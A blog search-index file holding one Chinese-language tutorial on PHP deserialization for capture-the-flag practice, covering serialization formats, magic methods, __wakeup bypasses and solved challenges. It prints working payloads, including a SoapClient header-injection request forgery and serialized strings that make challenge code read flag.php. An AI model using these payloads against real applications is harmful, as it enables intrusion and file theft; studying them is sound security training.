<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php反序列化一</title>
      <link href="/2024/09/19/php-fan-xu-lie-hua-yi/"/>
      <url>/2024/09/19/php-fan-xu-lie-hua-yi/</url>
      
        <content type="html"><![CDATA[<h3 id="1-主要特征：一般黑盒跟扫描很难发现，在代码审计里面能找到"><a href="#1-主要特征：一般黑盒跟扫描很难发现，在代码审计里面能找到" class="headerlink" title="1.主要特征：一般黑盒跟扫描很难发现，在代码审计里面能找到"></a>1.主要特征：一般黑盒跟扫描很难发现，在代码审计里面能找到</h3><h3 id="2-对象经过序列化转化为字符串"><a href="#2-对象经过序列化转化为字符串" class="headerlink" title="2.对象经过序列化转化为字符串"></a>2.对象经过序列化转化为字符串</h3><p>例子如下：</p><p> nullserialize()N;<br> 666serialize()i:666;<br> 66.6   serialize()d;66.6;<br> true   serialize()b:1;<br> false  serialize()b:0;<br> ‘benben’serialize()s:6:”benben”;<br>array(‘benben’,’dazhuang’,’laoliu’);serialize()a:3(参数数量):{i:0(编号);s:6:”benben”;i:1;s:8:”dazhuang”;i:2;s:6:”laoliu”;}</p><pre class=" language-&lt;?php"><code class="language-&lt;?php">highlight_file(__FILE__);class sunset&#123;    public $flag='flag&#123;asdadasd&#125;';    public $name='makabaka';    public $age='18';&#125;$ctfer=new sunset(); //实例化一个对象echo serialize($ctfer);?></code></pre><p>返回结果<br>O:6(类的长度):”sunset”:3:{s:4:”flag”;s:14:”flag{asdadasd}”;s:4:”name”;s:8:”makabaka”;s:3:”age”;s:2:”18”;}</p><h3 id="3-PHP中public、protected、private的区别对比"><a href="#3-PHP中public、protected、private的区别对比" class="headerlink" title="3.PHP中public、protected、private的区别对比"></a>3.PHP中public、protected、private的区别对比</h3><h4 id="3-1-public修饰的属性和方法可以在任何地方被访问，包括类的内部、子类和外部代码。"><a href="#3-1-public修饰的属性和方法可以在任何地方被访问，包括类的内部、子类和外部代码。" class="headerlink" title="3.1 public修饰的属性和方法可以在任何地方被访问，包括类的内部、子类和外部代码。"></a>3.1 public修饰的属性和方法可以在任何地方被访问，包括类的内部、子类和外部代码。</h4><pre><code>&lt;?phpclass Person &#123;  public $name;  public function sayHello() &#123;    echo &quot;Hello!&quot;;  &#125;&#125;$person = new Person();echo $person-&gt;name; // 可以直接访问 public 属性$person-&gt;sayHello(); // 可以直接调用 public 方法?&gt;</code></pre><h4 id="3-2-protected修饰的属性和方法只能在当前类及其子类中被访问，外部的代码访问不了"><a href="#3-2-protected修饰的属性和方法只能在当前类及其子类中被访问，外部的代码访问不了" class="headerlink" title="3.2 protected修饰的属性和方法只能在当前类及其子类中被访问，外部的代码访问不了"></a>3.2 protected修饰的属性和方法只能在当前类及其子类中被访问，外部的代码访问不了</h4><pre><code>&lt;?phphighlight_file(__FILE__);class Person &#123;    protected $name;    protected function sayHello() &#123;      echo &quot;Hello!&quot;;    &#125;  &#125;  class Student extends Person &#123;    public function showName() &#123;      echo $this-&gt;name; // 子类可以访问 protected 属性      $this-&gt;sayHello(); // 子类可以调用 protected 方法    &#125;  &#125;  $student = new Student();  $student-&gt;showName(); // 可以访问父类的 protected 属性和方法  echo $student-&gt;name; // 外部代码不能访问 protected 属性  会显示错误  $student-&gt;sayHello(); // 外部代码不能调用 protected 方法 会显示错误?&gt;</code></pre><h4 id="3-3-private修饰的属性和方法只能在当前类中被访问，子类和外部代码不能访问。"><a href="#3-3-private修饰的属性和方法只能在当前类中被访问，子类和外部代码不能访问。" class="headerlink" title="3.3 private修饰的属性和方法只能在当前类中被访问，子类和外部代码不能访问。"></a>3.3 private修饰的属性和方法只能在当前类中被访问，子类和外部代码不能访问。</h4><pre><code>&lt;?phphighlight_file(__FILE__);class Person &#123;    private $name;    private function sayHello() &#123;      echo &quot;Hello!&quot;;    &#125;  &#125;  class Student extends Person &#123;    public function showName() &#123;      echo $this-&gt;name; // 子类不能访问父类的 private 属性      $this-&gt;sayHello(); // 子类不能调用父类的 private 方法    &#125;  &#125;  $person = new Person();  echo $person-&gt;name; // 外部代码不能访问 private 属性 会发生报错  $person-&gt;sayHello(); // 外部代码不能调用 private 方法 会发生报错?&gt;</code></pre><h4 id="3-4-总对比："><a href="#3-4-总对比：" class="headerlink" title="3.4 总对比："></a>3.4 总对比：</h4><pre><code>&lt;?php    class FileHandler_X&#123;        public $op=2;        public $filename=&quot;flag.php&quot;;        public $content=&quot;123&quot;;    &#125;class FileHandler_Y&#123;    protected $op=2;    protected $filename=&quot;flag.php&quot;;    protected $content=&quot;123&quot;;&#125;class FileHandler_Z&#123;    private $op=2;    private $filename=&quot;flag.php&quot;;    private $content=&quot;123&quot;;&#125;echo serialize(new FileHandler_X());echo &#39;&lt;br/&gt;&#39;;echo serialize(new FileHandler_Y());echo &#39;&lt;br/&gt;&#39;;echo serialize(new FileHandler_Z());?&gt;    </code></pre><p>输出：</p><pre><code>O:13:&quot;FileHandler_X&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;123&quot;;&#125;O:13:&quot;FileHandler_Y&quot;:3:&#123;s:5:&quot;\00*\00op&quot;;i:2;s:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;\00*\00content&quot;;s:3:&quot;123&quot;;&#125;O:13:&quot;FileHandler_Z&quot;:3:&#123;s:17:&quot;\00FileHandler_Z\00op&quot;;i:2;s:23:&quot;\00FileHandler_Z\00filename&quot;;s:8:&quot;flag.php&quot;;s:22:&quot;\00FileHandler_Z\00content&quot;;s:3:&quot;123&quot;;&#125;</code></pre><p>对比<br>public无标记，变量名不变，长度不变: s:2:”op”;i:2;<br>protected在变量名前添加标记\00<em>\00，长度+3: s:5:”\00</em>\00op”;i:2;<br>private在变量名前添加标记\00(classname)\00，长度+2+类名长度: s:17:”\00FileHandler_Z\00op”;i:2;</p><h3 id="4-反序列化：将序列化后的字符串反序列化转化为实例化对象"><a href="#4-反序列化：将序列化后的字符串反序列化转化为实例化对象" class="headerlink" title="4.反序列化：将序列化后的字符串反序列化转化为实例化对象"></a>4.反序列化：将序列化后的字符串反序列化转化为实例化对象</h3><h3 id="5-魔术方法："><a href="#5-魔术方法：" class="headerlink" title="5.魔术方法："></a>5.魔术方法：</h3><pre><code>魔术方法触发前提:魔术方法所在类(或对象)被调用__construct()//创建对象时触发反序列化不会触发__destruct() //对象被销毁时触发反序列化之后触发序列化时不会触发__wakeup()//反序列化之前会触发__sleep()//序列化之前触发__toString()//把对象当成字符串调用时触发__invoke()//把对象当成函数调用时触发__call() //在对象上下文中调用不可访问的方法时触发//调用一个不存在的方法时会触发__callStatic() //在静态上下文中调用不可访问的方法时触发//静态调用或调用成员常量时使用的方法不存在__get() //用于从不可访问的属性读取数据//调用的成员属性不存在时会触发__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__clone()//当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</code></pre><h3 id="5-pop链构造"><a href="#5-pop链构造" class="headerlink" title="5.pop链构造"></a>5.pop链构造</h3><p>利用反推法：先找到漏洞利用点（函数）再找到从哪里调用漏洞利用点</p><h3 id="6-字符串逃逸"><a href="#6-字符串逃逸" class="headerlink" title="6.字符串逃逸"></a>6.字符串逃逸</h3><h3 id="7-绕过正则表达式检测o-11类似字符串，可用o-11-绕过"><a href="#7-绕过正则表达式检测o-11类似字符串，可用o-11-绕过" class="headerlink" title="7.绕过正则表达式检测o:11类似字符串，可用o+11:绕过"></a>7.绕过正则表达式检测o:11类似字符串，可用o+11:绕过</h3><h3 id="8-原生类的反序列化"><a href="#8-原生类的反序列化" class="headerlink" title="8.原生类的反序列化"></a>8.原生类的反序列化</h3><p>CTFSHOW Web259 SoapClient原生类的反序列化，exp如下：</p><pre><code>&lt;?php//token=ctfshow$u = &quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;$client = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;127.0.0.1&#39;,&#39;location&#39;=&gt;&#39;http://127.0.0.1/flag.php&#39;,&#39;user_agent&#39;=&gt;$u));//$client-&gt;getFlag();echo urlencode(serialize($client));?&gt;</code></pre><h3 id="9-wakeup-方法绕过"><a href="#9-wakeup-方法绕过" class="headerlink" title="9._wakeup()方法绕过"></a>9._wakeup()方法绕过</h3><p>在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。<br>变量引用：两个变量同时指向同一个内存地址，用取地址符&amp;<br>属性个数不匹配(cve-2016-7124)：影响范围：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10<br>正常来说在反序列化过程中，会先调用wakeup()方法再进行unserilize()，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。<br>C绕过：O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。<br>fast-destruct：本质上就是利用GC回收机制。方法有两种，删除末尾的花括号、数组对象占用指针（改数字）<br>其余GC回收机制：属性值的长度不匹配</p><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="题一：-极客大挑战-2019-PHP-1"><a href="#题一：-极客大挑战-2019-PHP-1" class="headerlink" title="题一：[极客大挑战 2019]PHP 1"></a>题一：[极客大挑战 2019]PHP 1</h4><pre><code>&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123;    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;     function __wakeup()&#123;        $this-&gt;username = &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        &#125;    &#125;&#125;?&gt;index.php:&lt;?php include &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);?&gt;</code></pre><p>通过这里可以发现username&#x3D;admin并且password&#x3D;100才会输出flag，则构造反序列化payload如下：</p><pre><code>&lt;?phpclass Name&#123;    private $username = &#39;admin&#39;;    private $password = &#39;100&#39;;    &#125; $select = new Name(); $res=serialize(@$select);    echo $res?&gt;</code></pre><p>然后获得序列化后的字符串：O:4:”Name”:2:{s:14:”口Name口username”;s:6:”admin”;s:14:”口Name口password”;s:3:”100”;}<br>在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，即把Name后面的数字2该为大于2的数字，于是我们这样构造payload：?select&#x3D;O:4:”Name”:3:{s:14:”口Name口username”;s:6:”admin”;s:14:”口Name口password”;s:3:”100”;}</p><p>接着我们发现，username和password为private声明的变量。因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00因此私有字段的字段名在序列化的时候，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度<br>所以得到最终payload:?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><h4 id="题二：-网鼎杯-2020-青龙组-AreUSerialz1"><a href="#题二：-网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="题二：[网鼎杯 2020 青龙组]AreUSerialz1"></a>题二：[网鼎杯 2020 青龙组]AreUSerialz1</h4><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;protected $op;protected $filename;protected $content;function __construct() &#123;    $op = &quot;1&quot;;    $filename = &quot;/tmp/tmpfile&quot;;    $content = &quot;Hello World!&quot;;    $this-&gt;process();&#125;public function process() &#123;    if($this-&gt;op == &quot;1&quot;) &#123;        $this-&gt;write();    &#125; else if($this-&gt;op == &quot;2&quot;) &#123;        $res = $this-&gt;read();        $this-&gt;output($res);    &#125; else &#123;        $this-&gt;output(&quot;Bad Hacker!&quot;);    &#125;&#125;private function write() &#123;    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;        if(strlen((string)$this-&gt;content) &gt; 100) &#123;            $this-&gt;output(&quot;Too long!&quot;);            die();        &#125;        $res = file_put_contents($this-&gt;filename, $this-&gt;content);        if($res) $this-&gt;output(&quot;Successful!&quot;);        else $this-&gt;output(&quot;Failed!&quot;);    &#125; else &#123;        $this-&gt;output(&quot;Failed!&quot;);    &#125;&#125;private function read() &#123;    $res = &quot;&quot;;    if(isset($this-&gt;filename)) &#123;        $res = file_get_contents($this-&gt;filename);    &#125;    return $res;&#125;private function output($s) &#123;    echo &quot;[Result]: &lt;br&gt;&quot;;    echo $s;&#125;function __destruct() &#123;    if($this-&gt;op === &quot;2&quot;)        $this-&gt;op = &quot;1&quot;;    $this-&gt;content = &quot;&quot;;    $this-&gt;process();&#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;$str = (string)$_GET[&#39;str&#39;];if(is_valid($str)) &#123;    $obj = unserialize($str);&#125;&#125;</code></pre><p>通过审计构造exp:</p><pre><code>&lt;?php    class FileHandler &#123;        public $op = 2;        public $filename = &quot;flag.php&quot;;//这里要多去尝试文件路径        public $content=&quot;1235&quot;;    &#125;    $flag = new FileHandler();    print(serialize($flag));?&gt;</code></pre><p>得到O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:4:”1235”;}<br>构造最终payload:?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:4:”1235”;}</p>]]></content>
      
      
      <categories>
          
          <category> WEB基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
